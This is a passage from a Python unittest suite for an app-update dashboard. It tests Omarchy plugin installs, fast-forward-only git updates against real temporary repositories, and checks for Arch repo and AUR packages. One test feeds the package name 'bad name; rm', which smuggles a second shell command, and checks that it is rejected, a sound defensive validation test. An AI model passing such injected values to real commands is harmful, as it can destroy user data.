        self.assertFalse(r['ok'])
        self.assertEqual(self.calls, [])

    def test_a_refused_add_reports_omarchys_words(self):
        self.add_rc = 1
        r = self.install('acme.weather')
        self.assertFalse(r['ok'])
        self.assertIn('validation failed', r['message'])
        self.assertFalse(dash.load_history()[-1]['ok'])

    def test_a_replacement_bar_is_installed_but_left_off(self):
        self.kinds = ['bar']
        r = self.install('acme.bar')
        self.assertTrue(r['ok'], r)
        self.assertFalse(any(c[:3] == ['omarchy', 'plugin', 'enable'] for c in self.calls))
        self.assertIn('left off', r['message'])

    def test_not_picked_up_by_the_shell_is_a_failure_that_says_how_to_finish(self):
        self.listed = False
        r = self.install('acme.weather')
        self.assertFalse(r['ok'])
        self.assertIn('omarchy plugin enable acme.weather', r['message'])

    def test_install_is_a_job_kind(self):
        seen = []
        with patch.object(dash, 'cmd_install', lambda a: seen.append(a.id) or print(json.dumps({'ok': True}))):
            dash.execute_job(dash.new_job('install', ['acme.weather']))
        self.assertEqual(seen, ['acme.weather'])


class RepoAppUpdateTests(unittest.TestCase):
    """A source app whose update command only builds (`make install`): a real upstream and
    clone, so the fetch/merge/verify run for real; the build itself is `true`."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        self.upstream = root / 'upstream'
        self.upstream.mkdir()
        git(self.upstream, 'init', '-q', '-b', 'main')
        git(self.upstream, 'config', 'user.email', 't@t'); git(self.upstream, 'config', 'user.name', 't')
        (self.upstream / 'app.c').write_text('one')
        git(self.upstream, 'add', '.'); git(self.upstream, 'commit', '-qm', 'one')
        self.clone = root / 'clone'
        __import__("subprocess").run(["git", "clone", "-q", str(self.upstream), str(self.clone)], check=True)
        (self.upstream / 'app.c').write_text('two')
        git(self.upstream, 'commit', '-qam', 'two')
        self.new = git(self.upstream, 'rev-parse', 'HEAD')
        self.app = {'id': 'tool', 'name': 'Tool', 'repoDir': str(self.clone), 'pkgName': 'tool',
                    'branch': 'main', 'remote': 'origin', 'updateCmd': ['true']}
        state = root / 'state'
        self.printed = []
        for target, value in (('STATE', state), ('STATUS_PATH', state / 'status.json'),
                              ('load_apps', lambda: [self.app]), ('ensure_apps_file', lambda: None),
                              ('check_all', lambda: {}), ('pkg_version', lambda name: '')):
            p = patch.object(dash, target, value)
            p.start()
            self.addCleanup(p.stop)
        p = patch('builtins.print', lambda *a, **k: self.printed.append(json.loads(a[0])))
        p.start()
        self.addCleanup(p.stop)

    def update(self):
        dash.cmd_update(type('A', (), {'id': 'tool'})())
        return self.printed[-1]

    def test_a_build_only_command_that_leaves_upstream_out_is_a_failure(self):
        self.assertEqual(dash.check_app(self.app)['updateState'], 'behind')
        r = self.update()
        self.assertFalse(r['ok'])
        self.assertIn("still lacks upstream's commits", r['message'])

    def test_pull_first_fast_forwards_then_builds(self):
        self.app['pullFirst'] = True
        r = self.update()
        self.assertTrue(r['ok'], r)
        self.assertEqual(git(self.clone, 'rev-parse', 'HEAD'), self.new)

    def test_pull_first_never_merges_over_local_commits(self):
        self.app['pullFirst'] = True
        git(self.clone, 'config', 'user.email', 't@t'); git(self.clone, 'config', 'user.name', 't')
        (self.clone / 'local.txt').write_text('mine')
        git(self.clone, 'add', '.'); git(self.clone, 'commit', '-qm', 'mine')
        mine = git(self.clone, 'rev-parse', 'HEAD')
        r = self.update()
        self.assertFalse(r['ok'])
        self.assertIn('Could not fast-forward', r['message'])
        self.assertEqual(git(self.clone, 'rev-parse', 'HEAD'), mine)

    def test_pull_first_refuses_another_branch(self):
        self.app['pullFirst'] = True
        git(self.clone, 'checkout', '-qb', 'other')
        r = self.update()
        self.assertFalse(r['ok'])
        self.assertIn('needs main checked out', r['message'])

    def test_add_repo_guess_pulls_first_without_rebuild_sh(self):
        fields, notes = dash.inspect_repo(str(self.clone))
        self.assertTrue(fields['pullFirst'])


class PackageAppTests(unittest.TestCase):
    def ctx(self, **over):
        c = {'repos': {'brave-bin': 'omarchy', 'howdy': '', 'foo-git': '', 'gone': ''},
             'sync': {}, 'syncError': '', 'aur': {}, 'aurError': ''}
        c.update(over)
        return c

    def check(self, pkg, ctx, installed='1.0-1', older=False):
        with patch.object(dash, 'pkg_version', return_value=installed), \
             patch.object(dash, 'installed_older_than', return_value=older):
            return dash.check_package_app({'id': pkg, 'name': pkg, 'source': 'package', 'pkgName': pkg}, ctx)

    def test_repo_package_is_behind_when_checkupdates_lists_it(self):
        item = self.check('brave-bin', self.ctx(sync={'brave-bin': '1:1.99.0-1'}))
        self.assertEqual((item['updateState'], item['upstreamVersion'], item['updateVia']),
                         ('behind', '1:1.99.0-1', 'system'))
        self.assertTrue(dash.alerts(item))
        self.assertEqual(self.check('brave-bin', self.ctx())['updateState'], 'up-to-date')

    def test_failed_checkupdates_is_unreachable_not_current(self):
        item = self.check('brave-bin', self.ctx(sync=None, syncError='no network'))
        self.assertEqual((item['updateState'], item['reason']), ('unreachable', 'no network'))

    def test_aur_package_compares_with_the_aur_version(self):
        item = self.check('howdy', self.ctx(aur={'howdy': '2.7.0-1'}), older=True)
        self.assertEqual((item['updateState'], item['updateVia']), ('behind', 'aur'))
        self.assertIn('aur.archlinux.org/packages/howdy', item['info']['webUrl'])
        self.assertEqual(self.check('howdy', self.ctx(aur={'howdy': '1.0-1'}))['updateState'], 'up-to-date')

    def test_vcs_unknown_and_missing_packages_say_so(self):
        self.assertEqual(self.check('foo-git', self.ctx())['updateState'], 'no-repo')
        self.assertIn('not in the repos or the AUR', self.check('gone', self.ctx())['reason'])
        self.assertIn('not installed', self.check('brave-bin', self.ctx(), installed='')['reason'])

    def test_context_only_asks_the_sources_in_use(self):
        apps = [{'id': 'brave', 'source': 'package', 'pkgName': 'brave-bin'},
                {'id': 'flea', 'repoDir': '/x'}]
        with patch.object(dash, 'sync_repo', return_value='omarchy'), \
             patch.object(dash, 'sync_updates', return_value=({}, '')) as su, \
             patch.object(dash, 'aur_versions') as av:
            dash.package_context(apps)
        su.assert_called_once()
        av.assert_not_called()

    def test_checkupdates_output_is_parsed_and_rc2_means_none(self):
        out = 'brave-bin 1:1.98.60-1 -> 1:1.99.0-1\nc-ares 1.34.8-1 -> 1.34.9-1\n'
        with patch.object(dash, 'run', return_value=(0, out, '')):
            self.assertEqual(dash.sync_updates(), ({'brave-bin': '1:1.99.0-1', 'c-ares': '1.34.9-1'}, ''))
        with patch.object(dash, 'run', return_value=(2, '', '')):
            self.assertEqual(dash.sync_updates(), ({}, ''))
        with patch.object(dash, 'run', return_value=(1, '', 'cannot sync')):
            self.assertEqual(dash.sync_updates()[0], None)

    def test_a_package_app_never_updates_as_a_background_job(self):
        with patch.object(dash, 'ensure_apps_file'), \
             patch.object(dash, 'load_apps', return_value=[{'id': 'brave', 'name': 'Brave', 'source': 'package',
                                                            'pkgName': 'brave-bin'}]), \
             patch.object(dash, 'run') as run_mock, patch('builtins.print') as printed:
            dash.cmd_update(type('A', (), {'id': 'brave'})())
        run_mock.assert_not_called()
        self.assertIn('terminal', json.loads(printed.call_args[0][0])['message'])

    def test_inspect_package_names_it_and_says_how_it_updates(self):
        with patch.object(dash, 'installed_name', return_value='brave-bin'), \
             patch.object(dash, 'sync_repo', return_value='omarchy'), \
             patch.object(dash, 'load_apps', return_value=[]):
            fields, notes = dash.inspect_package('brave-bin')
        self.assertEqual((fields['id'], fields['name'], fields['source']), ('brave-bin', 'Brave', 'package'))
        self.assertIn('omarchy update', notes[0])
        with patch.object(dash, 'installed_name', return_value=''), \
             patch.object(dash, 'run', return_value=(0, 'brave-bin\nbash\nlibbrave\n', '')):
            fields, notes = dash.inspect_package('brave')
        self.assertIsNone(fields)
        self.assertIn('Did you mean brave-bin or libbrave?', notes[0])
        # A name another package provides is tracked as that package.
        with patch.object(dash, 'installed_name', return_value='brave-bin'), \
             patch.object(dash, 'sync_repo', return_value='omarchy'), \
             patch.object(dash, 'load_apps', return_value=[]):
            fields, notes = dash.inspect_package('brave')
        self.assertEqual((fields['pkgName'], fields['id'], fields['name']), ('brave-bin', 'brave-bin', 'Brave'))
        self.assertIn('provided by brave-bin', notes[0])
        self.assertIsNone(dash.inspect_package('bad name; rm')[0])

    def test_terminal_ids_picks_out_package_apps(self):
        items = [{'id': 'brave', 'source': 'package'}, {'id': 'flea'}, {'id': 'x.plugin'}]
        self.assertEqual(dash.terminal_ids(items, ['flea', 'brave', 'x.plugin']), ['brave'])


class SeedAppsTests(unittest.TestCase):
    def test_only_apps_whose_checkout_exists_are_seeded(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'flea' / '.git').mkdir(parents=True)
            seeds = [{'id': 'flea', 'repoDir': str(Path(d) / 'flea')}, {'id': 'howdy', 'repoDir': str(Path(d) / 'howdy')}]
            apps_path = Path(d) / 'state' / 'apps.json'
            with patch.object(dash, 'DEFAULT_APPS', seeds), patch.object(dash, 'APPS_PATH', apps_path), \
                 patch.object(dash, 'STATE', apps_path.parent):
                self.assertEqual([a['id'] for a in dash.load_apps()], ['flea'])
                dash.ensure_apps_file()
                self.assertEqual([a['id'] for a in json.loads(apps_path.read_text())], ['flea'])

    def test_someone_else_starts_with_no_apps(self):
        with tempfile.TemporaryDirectory() as d:
            apps_path = Path(d) / 'apps.json'
            with patch.object(dash, 'DEFAULT_APPS', [{'id': 'flea', 'repoDir': str(Path(d) / 'nope')}]), \
                 patch.object(dash, 'APPS_PATH', apps_path), patch.object(dash, 'STATE', Path(d)):
                dash.ensure_apps_file()
                self.assertEqual(json.loads(apps_path.read_text()), [])
